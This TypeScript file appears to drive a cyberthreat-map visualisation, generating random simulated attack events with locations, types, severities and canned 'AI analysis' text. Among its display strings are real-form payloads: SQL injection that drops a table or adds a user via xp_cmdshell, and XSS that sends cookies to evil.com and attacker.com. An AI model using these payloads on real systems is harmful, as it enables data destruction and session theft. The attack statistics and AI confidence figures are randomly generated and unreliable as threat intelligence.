// Cyberthreat Simulation Engine
// Generates realistic attack data for visualization

export interface GeoLocation {
  lat: number;
  lng: number;
  city: string;
  country: string;
  countryCode: string;
}

export interface ThreatEvent {
  id: string;
  timestamp: Date;
  type: ThreatType;
  severity: SeverityLevel;
  source: GeoLocation;
  target: GeoLocation;
  protocol: string;
  port: number;
  payload: string;
  aiAnalysis: string;
  blocked: boolean;
  attackVector: string;
  malwareFamily?: string;
  cveId?: string;
}

export type ThreatType = 
  | 'DDoS'
  | 'SQL Injection'
  | 'XSS'
  | 'Ransomware'
  | 'Phishing'
  | 'Brute Force'
  | 'Zero-Day Exploit'
  | 'Man-in-the-Middle'
  | 'Cryptojacking'
  | 'APT'
  | 'Malware'
  | 'Data Exfiltration';

export type SeverityLevel = 'low' | 'medium' | 'high' | 'critical';

export interface CountryThreatStats {
  country: string;
  countryCode: string;
  attacksOriginated: number;
  attacksReceived: number;
  topThreatTypes: ThreatType[];
  riskLevel: SeverityLevel;
}

// Major cities with approximate coordinates for attack simulation
const attackSources: GeoLocation[] = [
  { lat: 55.7558, lng: 37.6173, city: 'Moscow', country: 'Russia', countryCode: 'RU' },
  { lat: 39.9042, lng: 116.4074, city: 'Beijing', country: 'China', countryCode: 'CN' },
  { lat: 31.2304, lng: 121.4737, city: 'Shanghai', country: 'China', countryCode: 'CN' },
  { lat: 39.0392, lng: 125.7625, city: 'Pyongyang', country: 'North Korea', countryCode: 'KP' },
  { lat: 35.6762, lng: 139.6503, city: 'Tokyo', country: 'Japan', countryCode: 'JP' },
  { lat: 22.3193, lng: 114.1694, city: 'Hong Kong', country: 'Hong Kong', countryCode: 'HK' },
  { lat: 51.5074, lng: -0.1278, city: 'London', country: 'United Kingdom', countryCode: 'GB' },
  { lat: 48.8566, lng: 2.3522, city: 'Paris', country: 'France', countryCode: 'FR' },
  { lat: 52.5200, lng: 13.4050, city: 'Berlin', country: 'Germany', countryCode: 'DE' },
  { lat: 55.6761, lng: 12.5683, city: 'Copenhagen', country: 'Denmark', countryCode: 'DK' },
  { lat: -33.8688, lng: 151.2093, city: 'Sydney', country: 'Australia', countryCode: 'AU' },
  { lat: 1.3521, lng: 103.8198, city: 'Singapore', country: 'Singapore', countryCode: 'SG' },
  { lat: 19.0760, lng: 72.8777, city: 'Mumbai', country: 'India', countryCode: 'IN' },
  { lat: 35.6892, lng: 51.3890, city: 'Tehran', country: 'Iran', countryCode: 'IR' },
  { lat: -23.5505, lng: -46.6333, city: 'São Paulo', country: 'Brazil', countryCode: 'BR' },
  { lat: 19.4326, lng: -99.1332, city: 'Mexico City', country: 'Mexico', countryCode: 'MX' },
  { lat: 6.5244, lng: 3.3792, city: 'Lagos', country: 'Nigeria', countryCode: 'NG' },
  { lat: 41.0082, lng: 28.9784, city: 'Istanbul', country: 'Turkey', countryCode: 'TR' },
  { lat: 50.4501, lng: 30.5234, city: 'Kyiv', country: 'Ukraine', countryCode: 'UA' },
  { lat: 52.2297, lng: 21.0122, city: 'Warsaw', country: 'Poland', countryCode: 'PL' },
];

const targetLocations: GeoLocation[] = [
  { lat: 40.7128, lng: -74.0060, city: 'New York', country: 'United States', countryCode: 'US' },
  { lat: 37.7749, lng: -122.4194, city: 'San Francisco', country: 'United States', countryCode: 'US' },
  { lat: 34.0522, lng: -118.2437, city: 'Los Angeles', country: 'United States', countryCode: 'US' },
  { lat: 47.6062, lng: -122.3321, city: 'Seattle', country: 'United States', countryCode: 'US' },
  { lat: 38.9072, lng: -77.0369, city: 'Washington D.C.', country: 'United States', countryCode: 'US' },
  { lat: 41.8781, lng: -87.6298, city: 'Chicago', country: 'United States', countryCode: 'US' },
  { lat: 51.5074, lng: -0.1278, city: 'London', country: 'United Kingdom', countryCode: 'GB' },
  { lat: 48.8566, lng: 2.3522, city: 'Paris', country: 'France', countryCode: 'FR' },
  { lat: 52.5200, lng: 13.4050, city: 'Berlin', country: 'Germany', countryCode: 'DE' },
  { lat: 35.6762, lng: 139.6503, city: 'Tokyo', country: 'Japan', countryCode: 'JP' },
  { lat: 37.5665, lng: 126.9780, city: 'Seoul', country: 'South Korea', countryCode: 'KR' },
  { lat: 43.6532, lng: -79.3832, city: 'Toronto', country: 'Canada', countryCode: 'CA' },
  { lat: -33.8688, lng: 151.2093, city: 'Sydney', country: 'Australia', countryCode: 'AU' },
  { lat: 1.3521, lng: 103.8198, city: 'Singapore', country: 'Singapore', countryCode: 'SG' },
  { lat: 25.2048, lng: 55.2708, city: 'Dubai', country: 'UAE', countryCode: 'AE' },
];

const threatTypes: { type: ThreatType; weight: number }[] = [
  { type: 'DDoS', weight: 25 },
  { type: 'SQL Injection', weight: 15 },
  { type: 'XSS', weight: 12 },
  { type: 'Ransomware', weight: 10 },
  { type: 'Phishing', weight: 18 },
  { type: 'Brute Force', weight: 20 },
  { type: 'Zero-Day Exploit', weight: 3 },
  { type: 'Man-in-the-Middle', weight: 5 },
  { type: 'Cryptojacking', weight: 8 },
  { type: 'APT', weight: 4 },
  { type: 'Malware', weight: 15 },
  { type: 'Data Exfiltration', weight: 6 },
];

const malwareFamilies = [
  'Emotet', 'TrickBot', 'Ryuk', 'Conti', 'LockBit', 'REvil', 
  'DarkSide', 'Cobalt Strike', 'Mimikatz', 'WannaCry', 'NotPetya',
  'Lazarus', 'APT28', 'APT29', 'Sandworm', 'Fancy Bear'
];

const attackVectors = [
  'Spear Phishing Email',
  'Watering Hole Attack',
  'Supply Chain Compromise',
  'Remote Desktop Protocol',
  'VPN Vulnerability',
  'Zero-Day Browser Exploit',
  'Malicious USB Device',
  'Social Engineering',
  'Drive-by Download',
  'Credential Stuffing',
  'DNS Hijacking',
  'BGP Hijacking',
];

const protocols = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'SSH', 'FTP', 'SMTP', 'DNS', 'ICMP'];

const commonPorts = [21, 22, 23, 25, 53, 80, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443];

function weightedRandom<T>(items: { type: T; weight: number }[]): T {
  const totalWeight = items.reduce((sum, item) => sum + item.weight, 0);
  let random = Math.random() * totalWeight;
  
  for (const item of items) {
    random -= item.weight;
    if (random <= 0) return item.type;
  }
  
  return items[0].type;
}

function randomElement<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function generatePayload(type: ThreatType): string {
  const payloads: Record<ThreatType, string[]> = {
    'DDoS': [
      'SYN Flood - 1.2M packets/sec',
      'UDP Amplification Attack - 50Gbps',
      'HTTP Layer 7 Flood - 500K req/sec',
      'DNS Amplification - 80Gbps',
    ],
    'SQL Injection': [
      "' OR '1'='1'; DROP TABLE users;--",
      "UNION SELECT * FROM credentials WHERE '1'='1",
      "'; EXEC xp_cmdshell('net user hacker P@ss123 /add');--",
    ],
    'XSS': [
      '<script>document.location="http://evil.com/steal.php?cookie="+document.cookie</script>',
      '<img src=x onerror=alert(document.domain)>',
      '<svg onload=fetch("//attacker.com/"+btoa(document.cookie))>',
    ],
    'Ransomware': [
      'LockBit 3.0 - AES-256 + RSA-4096 encryption',
      'BlackCat/ALPHV - Rust-based ransomware',
      'Conti Successor - Double extortion payload',
    ],
    'Phishing': [
      'Credential Harvesting - Microsoft 365 Clone',
      'Business Email Compromise - Invoice Fraud',
      'OAuth Consent Phishing - Azure AD',
    ],
    'Brute Force': [
      'SSH Dictionary Attack - 50K attempts/min',
      'RDP Credential Stuffing - Leaked DB',
      'WordPress Admin Bruteforce - 10K passwords',
    ],
    'Zero-Day Exploit': [
      'CVE-2024-XXXX - Remote Code Execution',
      'Kernel Privilege Escalation - Unpatched',
      'Memory Corruption - Buffer Overflow',
    ],
    'Man-in-the-Middle': [
      'SSL Strip Attack - HTTPS Downgrade',
      'ARP Spoofing - Network Interception',
      'DNS Spoofing - Traffic Redirect',
    ],
    'Cryptojacking': [
      'XMRig Miner - CPU 100% utilization',
      'Browser-based Coinhive Script',
      'Container Escape - Kubernetes Mining',
    ],
    'APT': [
      'State-Sponsored - Long-term Persistence',
      'Lateral Movement - Domain Admin Access',
      'Data Staging - Exfiltration Prep',
    ],
    'Malware': [
      'Trojan Downloader - Stage 2 Payload',
      'Backdoor Installation - C2 Beacon',
      'Rootkit - Kernel-level Persistence',
    ],
    'Data Exfiltration': [
      'DNS Tunneling - 500MB transferred',
      'HTTPS Covert Channel - Encrypted payload',
      'Cloud Storage Upload - S3 Bucket',
    ],
  };
  
  return randomElement(payloads[type]);
}

function generateAIAnalysis(threat: Partial<ThreatEvent>): string {
  const analyses: string[] = [
    `Neural network detected ${threat.type} pattern with 98.7% confidence. Attack signature matches known ${threat.malwareFamily || 'threat actor'} TTPs.`,
    `AI behavioral analysis flagged anomalous traffic from ${threat.source?.city}. Machine learning model identified ${threat.attackVector} methodology.`,
    `Deep learning classifier identified ${threat.type} attempt. Threat intelligence correlation shows connection to previous campaigns.`,
    `Ensemble model consensus: ${threat.severity?.toUpperCase()} risk. Pattern recognition indicates automated attack infrastructure.`,
    `Transformer-based analysis detected ${threat.type} indicators. Source IP reputation score: 2/100 (Malicious).`,
  ];
  
  return randomElement(analyses);
}

function determineSeverity(type: ThreatType): SeverityLevel {
  const severityMap: Record<ThreatType, SeverityLevel[]> = {
    'DDoS': ['medium', 'high', 'critical'],
    'SQL Injection': ['high', 'critical'],
    'XSS': ['low', 'medium', 'high'],
    'Ransomware': ['critical'],
    'Phishing': ['medium', 'high'],
    'Brute Force': ['low', 'medium'],
    'Zero-Day Exploit': ['critical'],
    'Man-in-the-Middle': ['high', 'critical'],
    'Cryptojacking': ['low', 'medium'],
    'APT': ['high', 'critical'],
    'Malware': ['medium', 'high', 'critical'],
    'Data Exfiltration': ['high', 'critical'],
  };
  
  return randomElement(severityMap[type]);
}

let eventCounter = 0;

export function generateThreatEvent(): ThreatEvent {
  const type = weightedRandom(threatTypes);
  const severity = determineSeverity(type);
  const source = randomElement(attackSources);
  const target = randomElement(targetLocations);
  const malwareFamily = ['Ransomware', 'Malware', 'APT'].includes(type) 
    ? randomElement(malwareFamilies) 
    : undefined;
  
  eventCounter++;
  
  const event: ThreatEvent = {
    id: `THREAT-${Date.now()}-${eventCounter.toString().padStart(6, '0')}`,
    timestamp: new Date(),
    type,
    severity,
    source,
    target,
    protocol: randomElement(protocols),
    port: randomElement(commonPorts),
    payload: generatePayload(type),
    blocked: Math.random() > 0.15, // 85% block rate
    attackVector: randomElement(attackVectors),
    malwareFamily,
    cveId: type === 'Zero-Day Exploit' ? `CVE-2024-${Math.floor(Math.random() * 9999).toString().padStart(4, '0')}` : undefined,
    aiAnalysis: '',
  };
  
  event.aiAnalysis = generateAIAnalysis(event);
  
  return event;
}

export function calculateCountryStats(events: ThreatEvent[]): CountryThreatStats[] {
  const statsMap = new Map<string, CountryThreatStats>();
  
  // Count attacks originated
  events.forEach(event => {
    const key = event.source.countryCode;
    if (!statsMap.has(key)) {
      statsMap.set(key, {
        country: event.source.country,
        countryCode: key,
        attacksOriginated: 0,
        attacksReceived: 0,
        topThreatTypes: [],
        riskLevel: 'low',
      });
    }
    statsMap.get(key)!.attacksOriginated++;
  });
  
  // Count attacks received
  events.forEach(event => {
    const key = event.target.countryCode;
    if (!statsMap.has(key)) {
      statsMap.set(key, {
        country: event.target.country,
        countryCode: key,
        attacksOriginated: 0,
        attacksReceived: 0,
        topThreatTypes: [],
        riskLevel: 'low',
      });
    }
    statsMap.get(key)!.attacksReceived++;
  });
  
  // Calculate risk levels and top threat types
  statsMap.forEach((stats, key) => {
    const countryEvents = events.filter(e => e.source.countryCode === key || e.target.countryCode === key);
    const typeCounts = new Map<ThreatType, number>();
    
    countryEvents.forEach(e => {
      typeCounts.set(e.type, (typeCounts.get(e.type) || 0) + 1);
    });
    
    stats.topThreatTypes = Array.from(typeCounts.entries())
      .sort((a, b) => b[1] - a[1])
      .slice(0, 3)
      .map(([type]) => type);
    
    const totalActivity = stats.attacksOriginated + stats.attacksReceived;
    if (totalActivity > 50) stats.riskLevel = 'critical';
    else if (totalActivity > 30) stats.riskLevel = 'high';
    else if (totalActivity > 15) stats.riskLevel = 'medium';
    else stats.riskLevel = 'low';
  });
  
  return Array.from(statsMap.values()).sort((a, b) => 
    (b.attacksOriginated + b.attacksReceived) - (a.attacksOriginated + a.attacksReceived)
  );
}

export function getSeverityColor(severity: SeverityLevel): string {
  const colors: Record<SeverityLevel, string> = {
    low: 'hsl(var(--cyber-green))',
    medium: 'hsl(var(--cyber-yellow))',
    high: 'hsl(var(--cyber-orange))',
    critical: 'hsl(var(--cyber-red))',
  };
  return colors[severity];
}

export function getThreatTypeIcon(type: ThreatType): string {
  const icons: Record<ThreatType, string> = {
    'DDoS': '🌊',
    'SQL Injection': '💉',
    'XSS': '📜',
    'Ransomware': '🔒',
    'Phishing': '🎣',
    'Brute Force': '🔨',
    'Zero-Day Exploit': '💀',
    'Man-in-the-Middle': '👤',
    'Cryptojacking': '⛏️',
    'APT': '🎯',
    'Malware': '🦠',
    'Data Exfiltration': '📤',
  };
  return icons[type];
}
